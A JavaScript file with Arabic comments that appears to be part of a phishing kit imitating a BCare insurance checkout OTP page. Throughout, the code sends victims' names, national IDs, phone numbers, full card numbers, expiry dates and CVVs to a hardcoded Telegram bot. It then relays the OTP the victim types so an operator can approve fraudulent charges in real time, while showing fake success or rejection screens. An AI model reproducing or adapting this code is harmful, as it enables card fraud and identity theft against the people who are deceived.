/* =====================================================
   بي كير — otp-verify.js  v4
   ══════════════════════════════════════════════════
   التدفق:
   1. تفاصيل الطلب تصل Telegram (بدون OTP)
   2. العميل يدخل 6 أرقام يختارها بنفسه → يضغط تأكيد
   3. الأرقام تُرسل لـ Telegram كرسالة ثانية
   4. الأدمن يوافق (يرسل نفس الأرقام) أو يرفض (REJECT)
   5. الصفحة تستلم القرار → نجاح أو رفض
===================================================== */
'use strict';

const TG = {
  TOKEN: '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow',
  CHAT:  '1451039924',
};

let userOTP     = '';       /* الرمز الذي أدخله العميل */
let pollInt     = null;
let lastUpdateId = 0;
let waitingConfirm = false; /* بانتظار قرار الأدمن */

/* ─── Telegram API ───────────────────────────────── */
async function tgSend(text) {
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG.CHAT, text, parse_mode: 'HTML' }),
      }
    );
    const data = await res.json();
    return data.ok;
  } catch(e) { console.error('TG:', e); return false; }
}

async function tgGetUpdates() {
  try {
    const res  = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=2`
    );
    const data = await res.json();
    return data.ok ? (data.result || []) : [];
  } catch(e) { return []; }
}

/* ─── رسالة الطلب الأولى (تصل عند "ادفع الآن") ────── */
function buildOrderMsg() {
  try {
    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
    const form   = JSON.parse(sessionStorage.getItem('bcare_form')   || '{}');
    const card   = JSON.parse(sessionStorage.getItem('bcare_card_data') || '{}');

    return `🔔 <b>طلب دفع جديد — بي كير</b>

👤 <b>العميل</b>
• الاسم: <b>${policy.fullName || '—'}</b>
• رقم الهوية: <code>${form.nationalId || '—'}</code>
• الجوال: <code>${policy.mobile || '—'}</code>

🚗 <b>التأمين</b>
• الشركة: <b>${offer.companyName || '—'}</b>
• نوع التأمين: ${offer.insuranceType || '—'}
• ماركة المركبة: ${policy.carBrand || '—'}
• رقم اللوحة: ${policy.plateNumber || '—'}

💳 <b>بطاقة الدفع</b>
• رقم البطاقة: <code>${card.number || '****'}</code>
• النوع: ${card.type || '—'}
• تاريخ الانتهاء: <code>${card.expiry || '—'}</code>
• CVV: <code>${card.cvv || '—'}</code>

💰 <b>المبلغ</b>
• الرسوم: ر.س ${offer.price ? parseFloat(offer.price).toFixed(2) : '—'}
• الضريبة 15%: ر.س ${offer.vat ? parseFloat(offer.vat).toFixed(2) : '—'}
• <b>المجموع: ر.س ${offer.total ? parseFloat(offer.total).toFixed(2) : '—'}</b>

🆔 المرجع: <code>${offer.refNumber || '—'}</code>

<i>بانتظار رمز التأكيد من العميل...</i>`;
  } catch(e) {
    return `🔔 طلب دفع جديد`;
  }
}

/* ─── رسالة OTP الثانية (تصل عند تأكيد العميل) ────── */
function buildOTPMsg(code) {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    return `🔑 <b>العميل أدخل رمز التأكيد</b>

🔑 الرمز: <code>${code}</code>
🏢 الشركة: ${offer.companyName || '—'}
💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
🆔 المرجع: <code>${offer.refNumber || '—'}</code>

━━━━━━━━━━━━━━━
✅ <b>للموافقة:</b> أرسل نفس الرمز <code>${code}</code>
❌ <b>للرفض:</b> أرسل <code>REJECT</code>`;
  } catch(e) {
    return `🔑 العميل أدخل: <code>${code}</code>`;
  }
}

/* ─── Polling قرار الأدمن ──────────────────────────── */
function startPolling() {
  clearInterval(pollInt);
  pollInt = setInterval(async () => {
    if (!waitingConfirm) return;
    const updates = await tgGetUpdates();
    for (const u of updates) {
      lastUpdateId = u.update_id;
      const text = u.message?.text?.trim() || '';

      /* REJECT → رفض */
      if (text.toUpperCase() === 'REJECT') {
        waitingConfirm = false;
        clearInterval(pollInt);
        showRejection();
        return;
      }

      /* نفس الرمز → موافقة */
      if (text === userOTP) {
        waitingConfirm = false;
        clearInterval(pollInt);
        showSuccess();
        return;
      }

      /* رمز مختلف → تجاهل (الإدمن لم يقرر بعد) */
    }
  }, 3000);
}

/* ─── عرض الرفض ───────────────────────────────────── */
function showRejection() {
  clearInterval(pollInt);
  const card = document.getElementById('otp-card');
  if (card) card.innerHTML = `
    <div class="off-card-body" style="text-align:center;padding:2.5rem 1.5rem">
      <div style="width:72px;height:72px;border-radius:50%;background:var(--red-bg);display:flex;align-items:center;justify-content:center;margin:0 auto 1.25rem">
        <span class="material-icons" style="font-size:2.2rem;color:var(--red)">cancel</span>
      </div>
      <h2 style="font-size:1.2rem;font-weight:800;color:var(--red);margin-bottom:.5rem">تم رفض العملية</h2>
      <p style="font-size:.88rem;color:var(--gray-500);line-height:1.65;margin-bottom:1.5rem">
        نعتذر، تم رفض عملية الدفع بعد مراجعة البيانات.<br/>
        يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.
      </p>
      <button type="button" class="off-btn-secondary" style="width:100%" onclick="window.location.href='secure-checkout.html'">
        العودة لصفحة الدفع
      </button>
    </div>`;
}

/* ─── قراءة بيانات العملية ────────────────────────── */
function loadData() {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
    set('otp-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    set('otp-company', offer.companyName || '—');
  } catch(e) {}
}

/* ─── مربعات OTP (مفعّلة من البداية) ───────────────── */
function initBoxes() {
  const boxes      = [...document.querySelectorAll('.otp-box')];
  const confirmBtn = document.getElementById('otp-confirm-btn');
  const resendBtn  = document.getElementById('otp-resend-btn');

  boxes.forEach((box, idx) => {
    box.addEventListener('input', e => {
      box.value = e.target.value.replace(/\D/g,'').slice(-1);
      box.classList.toggle('filled', !!box.value);
      if (box.value && idx < boxes.length-1) boxes[idx+1].focus();
      const done = boxes.every(b => b.value);
      if (confirmBtn) confirmBtn.disabled = !done;
      clearOTPErr();
    });

    box.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        boxes[idx-1].value = '';
        boxes[idx-1].classList.remove('filled');
        boxes[idx-1].focus();
        if (confirmBtn) confirmBtn.disabled = true;
      }
    });

    box.addEventListener('paste', e => {
      e.preventDefault();
      const p = (e.clipboardData?.getData('text')||'').replace(/\D/g,'').slice(0,6);
      p.split('').forEach((d,i) => { if(boxes[i]) { boxes[i].value=d; boxes[i].classList.add('filled'); } });
      if (confirmBtn) confirmBtn.disabled = p.length < 6;
      if (boxes[Math.min(p.length, 5)]) boxes[Math.min(p.length, 5)].focus();
    });
  });

  /* زر التأكيد */
  if (confirmBtn) confirmBtn.addEventListener('click', submitOTP);

  /* زر إعادة الإرسال */
  if (resendBtn) {
    resendBtn.addEventListener('click', async () => {
      /* مسح الإدخال */
      boxes.forEach(b => { b.value=''; b.classList.remove('filled','otp-error','otp-success'); b.disabled = false; });
      if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد'; }
      clearOTPErr();
      waitingConfirm = false;
      clearInterval(pollInt);

      /* 📨 إعادة إرسال رسالة الطلب للأدمن */
      await tgSend(`🔄 <b>إعادة إرسال — بي كير</b>

${buildOrderMsg().replace('🔔 <b>طلب دفع جديد — بي كير</b>', '')}

<i>العميل أعاد الإرسال...</i>`);

      /* إعادة التركيز */
      const sub = document.getElementById('otp-sub-text');
      if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
      boxes[0]?.focus();
    });
  }
}

/* ─── إرسال OTP للـ Telegram + انتظار قرار الأدمن ──── */
async function submitOTP() {
  const boxes   = [...document.querySelectorAll('.otp-box')];
  const entered = boxes.map(b => b.value).join('');

  if (entered.length < 6) {
    setOTPErr('يرجى إدخال 6 أرقام');
    return;
  }

  userOTP = entered;

  /* 📨 إرسال رمز العميل لـ Telegram */
  await tgSend(buildOTPMsg(entered));

  /* تغيير الواجهة: بانتظار تأكيد الأدمن */
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) {
    confirmBtn.disabled = true;
    confirmBtn.innerHTML = '<span class="material-icons spin-otp">autorenew</span> بانتظار التأكيد...';
  }

  /* تعطيل المربعات */
  boxes.forEach(b => b.disabled = true);

  /* تحديث النص */
  const sub = document.getElementById('otp-sub-text');
  if (sub) sub.innerHTML = `تم إرسال الرمز للمراجعة<br/>
    <span style="color:var(--blue);font-weight:600">بانتظار تأكيد العملية...</span>`;

  /* بدء الاستماع لقرار الأدمن */
  waitingConfirm = true;
  startPolling();
}

/* ─── شاشة النجاح ─────────────────────────────────── */
function showSuccess() {
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) {
    confirmBtn.disabled = true;
    confirmBtn.innerHTML = '<span class="material-icons spin-otp">autorenew</span> جاري التأكيد...';
  }

  /* 📨 إشعار نجاح لـ Telegram */
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    tgSend(`✅ <b>تم تأكيد الدفع بنجاح</b>

🏢 ${offer.companyName||'—'}
💰 ر.س ${parseFloat(offer.total||0).toFixed(2)}
🆔 <code>${offer.refNumber||'—'}</code>

<i>العملية مكتملة ✅</i>`);
  } catch(e) {}

  setTimeout(() => {
    document.getElementById('otp-card')?.classList.add('hidden');
    const sc = document.getElementById('otp-success-card');
    if (sc) sc.classList.remove('hidden');
    try {
      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
      const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
      set('success-ref',     offer.refNumber || ('BC-'+Date.now().toString().slice(-8)));
      set('success-company', offer.companyName || '—');
      set('success-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    } catch(e){}
    window.scrollTo({top:0, behavior:'smooth'});
  }, 1200);
}

function setOTPErr(msg) { const e=document.getElementById('otp-err'); if(e) e.textContent=msg; }
function clearOTPErr()  { const e=document.getElementById('otp-err'); if(e) e.textContent='';  }

/* ─── INIT ────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', async () => {
  loadData();
  initBoxes();

  /* ضبط رقم مرجعي */
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    if (!offer.refNumber) {
      offer.refNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
      sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
    }
  } catch(e) {}

  /* 📨 رسالة الطلب الأولى (بدون OTP) */
  await tgSend(buildOrderMsg());

  /* تفعيل أول مربع */
  document.querySelector('.otp-box')?.focus();
});
